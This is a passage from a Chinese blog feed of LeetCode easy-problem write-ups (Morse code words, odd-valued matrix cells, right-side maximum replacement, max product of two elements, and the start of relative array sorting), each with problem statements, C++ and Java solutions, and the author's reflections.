<h6 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a><strong>题目描述：</strong></h6><p>国际摩尔斯密码定义一种标准编码方式，将每个字母对应于一个由一系列点和短线组成的字符串， 比如: <code>&quot;a&quot;</code> 对应 <code>&quot;.-&quot;</code>, “b” 对应 <code>&quot;-...&quot;</code>, <code>&quot;c&quot;</code> 对应 <code>&quot;-.-.&quot;</code>, 等等。</p>
<a id="more"></a>
<p>为了方便，所有26个英文字母对应摩尔斯密码表如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[&quot;.-&quot;,&quot;-...&quot;,&quot;-.-.&quot;,&quot;-..&quot;,&quot;.&quot;,&quot;..-.&quot;,&quot;--.&quot;,&quot;....&quot;,&quot;..&quot;,&quot;.---&quot;,&quot;-.-&quot;,&quot;.-..&quot;,&quot;--&quot;,&quot;-.&quot;,&quot;---&quot;,&quot;.--.&quot;,&quot;--.-&quot;,&quot;.-.&quot;,&quot;...&quot;,&quot;-&quot;,&quot;..-&quot;,&quot;...-&quot;,&quot;.--&quot;,&quot;-..-&quot;,&quot;-.--&quot;,&quot;--..&quot;]</span><br></pre></td></tr></table></figure>
<p>给定一个单词列表，每个单词可以写成每个字母对应摩尔斯密码的组合。例如，”cab” 可以写成 “-.-..—…”，(即 “-.-.” + “.-“ + “-…” 字符串的结合)。我们将这样一个连接过程称作单词翻译。</p>
<p>返回我们可以获得所有词不同单词翻译的数量。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">例如:</span><br><span class="line">输入: words &#x3D; [&quot;gin&quot;, &quot;zen&quot;, &quot;gig&quot;, &quot;msg&quot;]</span><br><span class="line">输出: 2</span><br><span class="line">解释: </span><br><span class="line">各单词翻译如下:</span><br><span class="line">&quot;gin&quot; -&gt; &quot;--...-.&quot;</span><br><span class="line">&quot;zen&quot; -&gt; &quot;--...-.&quot;</span><br><span class="line">&quot;gig&quot; -&gt; &quot;--...--.&quot;</span><br><span class="line">&quot;msg&quot; -&gt; &quot;--...--.&quot;</span><br><span class="line"></span><br><span class="line">共有 2 种不同翻译, &quot;--...-.&quot; 和 &quot;--...--.&quot;.</span><br></pre></td></tr></table></figure>
<p><strong>注意:</strong></p>
<ul>
<li>单词列表<code>words</code> 的长度不会超过 <code>100</code>。</li>
<li>每个单词 <code>words[i]</code>的长度范围为 <code>[1, 12]</code>。</li>
<li>每个单词 <code>words[i]</code>只包含小写字母。</li>
</ul>
<center>🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️解题过程🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️</center>

<h6 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h6><p><strong>思路：</strong></p>
<p>建立摩尔斯密码和字母之间的映射，遍历words数组，对每一个单词求出对应的翻译，然后作为键存到map容器中，单词作为它的值。这样不同单词有相同翻译的时候，只会在map中存储一次，相同的键后面会覆盖前面的值。最后答案就是map容器元素的个数。</p>
<p><strong>c++代码：</strong>(执行用时8ms，击败65.97%，内存消耗8.9M，击败15.82%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">uniqueMorseRepresentations</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="built_in">string</span>&gt;&amp; words)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">string</span> s[<span class="number">26</span>]=&#123;<span class="string">&quot;.-&quot;</span>,<span class="string">&quot;-...&quot;</span>,<span class="string">&quot;-.-.&quot;</span>,<span class="string">&quot;-..&quot;</span>,<span class="string">&quot;.&quot;</span>,<span class="string">&quot;..-.&quot;</span>,<span class="string">&quot;--.&quot;</span>,<span class="string">&quot;....&quot;</span>,<span class="string">&quot;..&quot;</span>,<span class="string">&quot;.---&quot;</span>,<span class="string">&quot;-.-&quot;</span>,<span class="string">&quot;.-..&quot;</span>,<span class="string">&quot;--&quot;</span>,<span class="string">&quot;-.&quot;</span>,<span class="string">&quot;---&quot;</span>,<span class="string">&quot;.--.&quot;</span>,<span class="string">&quot;--.-&quot;</span>,<span class="string">&quot;.-.&quot;</span>,<span class="string">&quot;...&quot;</span>,<span class="string">&quot;-&quot;</span>,<span class="string">&quot;..-&quot;</span>,<span class="string">&quot;...-&quot;</span>,<span class="string">&quot;.--&quot;</span>,<span class="string">&quot;-..-&quot;</span>,<span class="string">&quot;-.--&quot;</span>,<span class="string">&quot;--..&quot;</span>&#125;;</span><br><span class="line">        <span class="built_in">string</span> alp=<span class="string">&quot;abcdefghijklmnopqrstuvwxyz&quot;</span>;</span><br><span class="line">        <span class="built_in">map</span>&lt;<span class="built_in">string</span>,<span class="built_in">string</span>&gt; m;</span><br><span class="line">        <span class="comment">//遍历单词列表</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;words.size();++i)&#123;</span><br><span class="line">            <span class="built_in">string</span> tmp=<span class="string">&quot;&quot;</span>;</span><br><span class="line">            <span class="comment">//转换单词中的每个字母为摩尔斯密码</span></span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">char</span> c:words[i])&#123;</span><br><span class="line">                tmp+=s[alp.find(c)];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//使用map容器存储，摩尔斯密码作为键，单词作为值，利用map中元素关键字不能重复的特性进行去重</span></span><br><span class="line">            m[tmp]=words[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> m.size();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<center>💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎官 方 题 解💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎</center>

<h6 id="官方题解"><a href="#官方题解" class="headerlink" title="官方题解:"></a><a href="https://leetcode-cn.com/problems/unique-morse-code-words/solution/wei-yi-mo-er-si-mi-ma-ci-by-leetcode/">官方题解</a>:</h6><p><strong>方法一：哈希集合</strong></p>
<p>我们将数组 <code>word</code> 中的每个单词转换为摩尔斯码，并加入哈希集合（HashSet）中，最终的答案即为哈希集合中元素的个数。</p>
<p><strong>Java代码：</strong>(执行用时2ms，击败99.10%，内存消耗36.4M，击败82.85%）</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">uniqueMorseRepresentations</span><span class="params">(String[] words)</span> </span>&#123;</span><br><span class="line">        String[] MORSE = <span class="keyword">new</span> String[]&#123;<span class="string">&quot;.-&quot;</span>,<span class="string">&quot;-...&quot;</span>,<span class="string">&quot;-.-.&quot;</span>,<span class="string">&quot;-..&quot;</span>,<span class="string">&quot;.&quot;</span>,<span class="string">&quot;..-.&quot;</span>,<span class="string">&quot;--.&quot;</span>,</span><br><span class="line">                         <span class="string">&quot;....&quot;</span>,<span class="string">&quot;..&quot;</span>,<span class="string">&quot;.---&quot;</span>,<span class="string">&quot;-.-&quot;</span>,<span class="string">&quot;.-..&quot;</span>,<span class="string">&quot;--&quot;</span>,<span class="string">&quot;-.&quot;</span>,</span><br><span class="line">                         <span class="string">&quot;---&quot;</span>,<span class="string">&quot;.--.&quot;</span>,<span class="string">&quot;--.-&quot;</span>,<span class="string">&quot;.-.&quot;</span>,<span class="string">&quot;...&quot;</span>,<span class="string">&quot;-&quot;</span>,<span class="string">&quot;..-&quot;</span>,</span><br><span class="line">                         <span class="string">&quot;...-&quot;</span>,<span class="string">&quot;.--&quot;</span>,<span class="string">&quot;-..-&quot;</span>,<span class="string">&quot;-.--&quot;</span>,<span class="string">&quot;--..&quot;</span>&#125;;</span><br><span class="line"></span><br><span class="line">        Set&lt;String&gt; seen = <span class="keyword">new</span> HashSet();</span><br><span class="line">        <span class="keyword">for</span> (String word: words) &#123;</span><br><span class="line">            StringBuilder code = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">char</span> c: word.toCharArray())</span><br><span class="line">                code.append(MORSE[c - <span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line">            seen.add(code.toString());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> seen.size();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>复杂度分析</strong></p>
<ul>
<li>时间复杂度：O(S)，其中 $S$ 是数组 <code>words</code> 中所有单词的长度之和。</li>
<li>空间复杂度：O(S)。</li>
</ul>
<center>⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳总 结⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳</center>

<h6 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h6><p>官方题解和我的思路一样，英雄所见略同😊，不过官方题解没给出c++实现只有Java和Python。另外在查找每个字母对应的摩尔斯码的时候，索引可以用字母和‘a’的差值来计算，不用像我那样去查找该字母在字母表中的位置。</p>
]]></content>
      <categories>
        <category>ACM</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>简单</tag>
      </tags>
  </entry>
  <entry>
    <title>奇数值单元格的数目</title>
    <url>/2020/11/13/%E5%A5%87%E6%95%B0%E5%80%BC%E5%8D%95%E5%85%83%E6%A0%BC%E7%9A%84%E6%95%B0%E7%9B%AE/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><strong><a href="https://leetcode-cn.com/problems/cells-with-odd-values-in-a-matrix/">题目地址</a></strong></p>
<p><strong>难度：</strong>⭐</p>
<h6 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a><strong>题目描述：</strong></h6><p>给你一个 <code>n</code> 行 <code>m</code> 列的矩阵，最开始的时候，每个单元格中的值都是 <code>0</code>。</p>
<p>另有一个索引数组 <code>indices</code>，<code>indices[i] = [ri, ci]</code> 中的 <code>ri</code> 和 <code>ci</code> 分别表示指定的行和列（从 <code>0</code> 开始编号）。</p>
<p>你需要将每对 <code>[ri, ci]</code> 指定的行和列上的所有单元格的值加 <code>1</code>。</p>
<p>请你在执行完所有 <code>indices</code> 指定的增量操作后，返回矩阵中 「奇数值单元格」 的数目。</p>
<a id="more"></a>
<p><strong>示例1：</strong></p>
<p><img src="/2020/11/13/%E5%A5%87%E6%95%B0%E5%80%BC%E5%8D%95%E5%85%83%E6%A0%BC%E7%9A%84%E6%95%B0%E7%9B%AE/e1.png" alt="img"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：n &#x3D; 2, m &#x3D; 3, indices &#x3D; [[0,1],[1,1]]</span><br><span class="line">输出：6</span><br><span class="line">解释：最开始的矩阵是 [[0,0,0],[0,0,0]]。</span><br><span class="line">第一次增量操作后得到 [[1,2,1],[0,1,0]]。</span><br><span class="line">最后的矩阵是 [[1,3,1],[1,3,1]]，里面有 6 个奇数。</span><br></pre></td></tr></table></figure>
<p><strong>示例2：</strong></p>
<p><img src="/2020/11/13/%E5%A5%87%E6%95%B0%E5%80%BC%E5%8D%95%E5%85%83%E6%A0%BC%E7%9A%84%E6%95%B0%E7%9B%AE/e2.png" alt="img"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：n &#x3D; 2, m &#x3D; 2, indices &#x3D; [[1,1],[0,0]]</span><br><span class="line">输出：0</span><br><span class="line">解释：最后的矩阵是 [[2,2],[2,2]]，里面没有奇数。</span><br></pre></td></tr></table></figure>
<p><strong>提示：</strong></p>
<ul>
<li><code>1 &lt;= n &lt;= 50</code></li>
<li><code>1 &lt;= m &lt;= 50</code></li>
<li><code>1 &lt;= indices.length &lt;= 100</code></li>
<li><code>0 &lt;= indices[i][0] &lt; n</code></li>
<li><code>0 &lt;= indices[i][1] &lt; m</code></li>
</ul>
<center>🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️解题过程🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️</center>

<h6 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h6><p><strong>思路：</strong></p>
<p>直接模拟，遍历数组中的元素，对相应的行和列中的单元格的值加1，最后遍历矩阵，统计奇数值单元格的数目。</p>
<p><strong>c++代码：</strong>(执行用时8ms，击败53.87%，内存消耗8.1M，击败10.00%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">oddCells</span><span class="params">(<span class="keyword">int</span> n, <span class="keyword">int</span> m, <span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt;&amp; indices)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//暴力模拟</span></span><br><span class="line">        <span class="keyword">int</span> result=<span class="number">0</span>;</span><br><span class="line">        <span class="comment">//二维vector容器初始化</span></span><br><span class="line">        <span class="function"><span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt; <span class="title">arr</span><span class="params">(n,<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;(m,<span class="number">0</span>))</span></span>;</span><br><span class="line">        <span class="keyword">int</span> i,j;</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;indices.size();++i)&#123;</span><br><span class="line">            <span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;m;++j)&#123;</span><br><span class="line">                ++arr[indices[i][<span class="number">0</span>]][j];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;n;++j)&#123;</span><br><span class="line">                ++arr[j][indices[i][<span class="number">1</span>]];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;n;++i)&#123;</span><br><span class="line">            <span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;m;++j)&#123;</span><br><span class="line">                <span class="keyword">if</span>(arr[i][j]%<span class="number">2</span>!=<span class="number">0</span>)&#123;</span><br><span class="line">                    ++result;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<center>⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳总 结⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳</center>

<h6 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h6><p>没有官方题解，自己的解法效率不是太高，题解中还是有一些好的解法的，比如，统计$n$行$m$列矩阵最后出现变动奇数次行的个数$rowNum$，和奇数次列的个数$colNum$，最后的奇数值单元格的数目计算是：$rowNum<em>m+colNum</em>n-rowNum<em>colNum</em>2$。</p>
]]></content>
      <categories>
        <category>ACM</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>简单</tag>
      </tags>
  </entry>
  <entry>
    <title>将每个元素替换为右侧最大元素</title>
    <url>/2020/11/13/%E5%B0%86%E6%AF%8F%E4%B8%AA%E5%85%83%E7%B4%A0%E6%9B%BF%E6%8D%A2%E4%B8%BA%E5%8F%B3%E4%BE%A7%E6%9C%80%E5%A4%A7%E5%85%83%E7%B4%A0/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><strong><a href="https://leetcode-cn.com/problems/replace-elements-with-greatest-element-on-right-side/">题目地址</a></strong></p>
<p><strong>难度：</strong>⭐</p>
<h6 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a><strong>题目描述：</strong></h6><p>给你一个数组 <code>arr</code> ，请你将每个元素用它右边最大的元素替换，如果是最后一个元素，用 <code>-1</code> 替换。</p>
<p>完成所有替换操作后，请你返回这个数组。</p>
<a id="more"></a>
<p><strong>示例：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：arr &#x3D; [17,18,5,4,6,1]</span><br><span class="line">输出：[18,6,6,6,1,-1]</span><br></pre></td></tr></table></figure>
<p><strong>提示：</strong></p>
<ul>
<li><code>1 &lt;= arr.length &lt;= 10^4</code></li>
<li><code>1 &lt;= arr[i] &lt;= 10^5</code></li>
</ul>
<center>🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️解题过程🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️</center>

<h6 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h6><p><strong>思路：</strong></p>
<p>直接模拟，遍历数组，对每一个元素找到它右边最大元素并替换，最后一个用-1替换。</p>
<p><strong>c++代码：</strong>(执行用时1664ms，击败5.05%，内存消耗14.1M，击败16.20%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; <span class="title">replaceElements</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; arr)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//遍历数组中的元素</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;arr.size()<span class="number">-1</span>;++i)&#123;</span><br><span class="line">            <span class="comment">//找到右边最大的元素</span></span><br><span class="line">            <span class="keyword">int</span> tmp=<span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=i+<span class="number">1</span>;j&lt;arr.size();++j)&#123;</span><br><span class="line">                <span class="keyword">if</span>(arr[j]&gt;tmp)&#123;</span><br><span class="line">                    tmp=arr[j];</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//用右边最大元素替换当前元素</span></span><br><span class="line">            arr[i]=tmp;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//最后一个元素用-1替换</span></span><br><span class="line">        arr[arr.size()<span class="number">-1</span>]=<span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">return</span> arr;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<center>💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎官 方 题 解💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎</center>

<h6 id="官方题解"><a href="#官方题解" class="headerlink" title="官方题解:"></a><a href="https://leetcode-cn.com/problems/replace-elements-with-greatest-element-on-right-side/solution/jiang-mei-ge-yuan-su-ti-huan-wei-you-ce-zui-da-y-5/">官方题解</a>:</h6><p><strong>方法一：逆序遍历</strong></p>
<p><strong>思路与算法</strong></p>
<p>本题等价于对于数组 <code>arr</code> 中的每个元素 <code>arr[i]</code>，将其替换成 <code>arr[i + 1], arr[i + 2], ..., arr[n - 1]</code> 中的最大值。因此我们可以逆序地遍历整个数组，同时维护从数组右端到当前位置所有元素的最大值。</p>
<p>设 <code>ans[i] = max(arr[i + 1], arr[i + 2], ..., arr[n - 1])</code>，那么在进行逆序遍历时，我们可以直接通过</p>
<p><code>ans[i] = max(ans[i + 1], arr[i + 1])</code><br>来递推地得到答案。</p>
<p><strong>c++代码：</strong>(执行用时32ms，击败62.78%，内存消耗14.2M，击败15.02%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; <span class="title">replaceElements</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; arr)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = arr.size();</span><br><span class="line">        <span class="function"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; <span class="title">ans</span><span class="params">(n)</span></span>;</span><br><span class="line">        ans[n - <span class="number">1</span>] = <span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = n - <span class="number">2</span>; i &gt;= <span class="number">0</span>; --i) &#123;</span><br><span class="line">            ans[i] = max(ans[i + <span class="number">1</span>], arr[i + <span class="number">1</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<ul>
<li><p>复杂度分析</p>
<p>时间复杂度：$O(N)$，其中 $N$ 是数组 $arr$ 的长度。</p>
<p>空间复杂度：$O(1)$，除了存储答案的数组 $ans$ 之外，额外的空间复杂度是 $O(1)$。</p>
</li>
</ul>
<center>⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳总 结⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳</center>

<h6 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h6><p>我的解法太暴力了🤣，效率太低。官方题解逆序遍历这个思路真妙,厉害。</p>
]]></content>
      <categories>
        <category>ACM</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>简单</tag>
      </tags>
  </entry>
  <entry>
    <title>数组中两元素的最大乘积</title>
    <url>/2020/11/13/%E6%95%B0%E7%BB%84%E4%B8%AD%E4%B8%A4%E5%85%83%E7%B4%A0%E7%9A%84%E6%9C%80%E5%A4%A7%E4%B9%98%E7%A7%AF/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><strong><a href="https://leetcode-cn.com/problems/maximum-product-of-two-elements-in-an-array/">题目地址</a></strong></p>
<p><strong>难度：</strong>⭐</p>
<h6 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a><strong>题目描述：</strong></h6><p>给你一个整数数组 <code>nums</code>，请你选择数组的两个不同下标 <code>i</code> 和 <code>j</code>，使 <code>(nums[i]-1)*(nums[j]-1)</code> 取得最大值。</p>
<p>请你计算并返回该式的最大值。</p>
<a id="more"></a>
<p><strong>示例1：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：nums &#x3D; [3,4,5,2]</span><br><span class="line">输出：12 </span><br><span class="line">解释：如果选择下标 i&#x3D;1 和 j&#x3D;2（下标从 0 开始），则可以获得最大值，(nums[1]-1)*(nums[2]-1) &#x3D; (4-1)*(5-1) &#x3D; 3*4 &#x3D; 12 。 </span><br></pre></td></tr></table></figure>
<p><strong>示例2：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：nums &#x3D; [1,5,4,5]</span><br><span class="line">输出：16</span><br><span class="line">解释：选择下标 i&#x3D;1 和 j&#x3D;3（下标从 0 开始），则可以获得最大值 (5-1)*(5-1) &#x3D; 16 。</span><br></pre></td></tr></table></figure>
<p><strong>示例3：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：nums &#x3D; [3,7]</span><br><span class="line">输出：12</span><br></pre></td></tr></table></figure>
<p><strong>提示：</strong></p>
<ul>
<li><code>2 &lt;= nums.length &lt;= 500</code></li>
<li><code>1 &lt;= nums[i] &lt;= 10^3</code></li>
</ul>
<center>🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️解题过程🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️</center>

<h6 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h6><p><strong>思路：</strong></p>
<p>调用&lt; algorithm&gt;头文件中的sort方法进行排序(默认升序)，然后用最后两个元素计算最大值返回。</p>
<p><strong>c++代码：</strong>(执行用时16ms，击败46.21%，内存消耗10.1M，击败32.85%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">maxProduct</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//调用sort排序（从小到大）</span></span><br><span class="line">        sort(nums.begin(),nums.end());</span><br><span class="line">        <span class="keyword">return</span> (nums[nums.size()<span class="number">-1</span>]<span class="number">-1</span>)*(nums[nums.size()<span class="number">-2</span>]<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<center>⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳总 结⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳</center>

<h6 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h6><p>没有官方题解(😍)，简单题刷过了就可以了。</p>
]]></content>
      <categories>
        <category>ACM</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>简单</tag>
      </tags>
  </entry>
  <entry>
    <title>数组的相对排序</title>
    <url>/2020/11/14/%E6%95%B0%E7%BB%84%E7%9A%84%E7%9B%B8%E5%AF%B9%E6%8E%92%E5%BA%8F/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><strong><a href="https://leetcode-cn.com/problems/relative-sort-array/">题目地址</a></strong></p>
<p><strong>难度：</strong>⭐</p>
<h6 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a><strong>题目描述：</strong></h6><p>给你两个数组，arr1 和 arr2，</p>
<p>arr2 中的元素各不相同<br>arr2 中的每个元素都出现在 arr1 中<br>对 arr1 中的元素进行排序，使 arr1 中项的相对顺序和 arr2 中的相对顺序相同。未在 arr2 中出现过的元素需要按照升序放在 arr1 的末尾。</p>
<a id="more"></a>
<p><strong>示例：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：arr1 &#x3D; [2,3,1,3,2,4,6,7,9,2,19], arr2 &#x3D; [2,1,4,3,9,6]</span><br><span class="line">输出：[2,2,2,1,4,3,3,9,6,7,19]</span><br></pre></td></tr></table></figure>
<p><strong>提示：</strong></p>
<ul>
<li><code>arr1.length, arr2.length &lt;= 1000</code></li>
<li><code>0 &lt;= arr1[i], arr2[i] &lt;= 1000</code></li>
<li><code>arr2</code> 中的元素 <code>arr2[i]</code> 各不相同</li>
<li><code>arr2</code> 中的每个元素 <code>arr2[i]</code> 都出现在 <code>arr1</code> 中</li>
</ul>
